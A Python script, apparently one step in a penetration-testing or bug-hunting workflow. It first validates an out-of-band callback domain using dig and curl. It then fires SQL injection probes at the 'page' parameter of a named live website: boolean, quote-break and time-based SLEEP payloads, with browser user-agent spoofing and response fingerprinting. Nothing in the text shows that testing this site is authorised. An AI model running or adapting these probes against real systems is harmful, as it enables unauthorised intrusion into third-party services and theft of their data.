#!/usr/bin/env python3
"""IC15 pass 1: validate OOB oracle, baseline the SQLi oracle on the home page."""
import subprocess, time, urllib.parse, os, hashlib

H = "https://www.infinitycapital.bh"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
OD = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
os.makedirs("/work/ic15", exist_ok=True)

def curl(url, extra=None, out=None, maxt=20):
    cmd = ["curl", "-s", "-o", out or "/dev/null", "-D", "-", "-w",
           "\n@@code=%{http_code} size=%{size_download} t=%{time_total}\n",
           "-A", UA, "--max-time", str(maxt), url]
    if extra: cmd[1:1] = extra
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.stdout

print("### OOB ORACLE VALIDATION (control host NEVER sent to any target)")
for h in ["totallyrandomctrl9x7q3", "zzqq9911probe"]:
    print("dig", h, "->", subprocess.run(["dig","+short",f"{h}.{OD}","A"],capture_output=True,text=True).stdout.strip() or "(no A)")
    o = curl(f"http://{h}.{OD}/x", out="/tmp/ctl.html")
    print("   http:", o.strip().splitlines()[-1] if o.strip() else "none")

print("\n### HOME page SQLi oracle on ?page=")
vals = ["1","2","2 AND 1=1","2 AND 1=2","1'","2 AND SLEEP(3)","3"]
for i,v in enumerate(vals):
    u = f"{H}/?page=" + urllib.parse.quote(v)
    body = f"/work/ic15/pg_{i}.html"
    o = curl(u, out=body)
    tail = [l for l in o.splitlines() if l.startswith("@@") or "x-vercel" in l.lower() or "set-cookie" in l.lower()]
    d = open(body,"rb").read() if os.path.exists(body) else b""
    print(f"[{v!r}] {' | '.join(tail)} md5={hashlib.md5(d).hexdigest()[:12]} bytes={len(d)}")
    time.sleep(4)
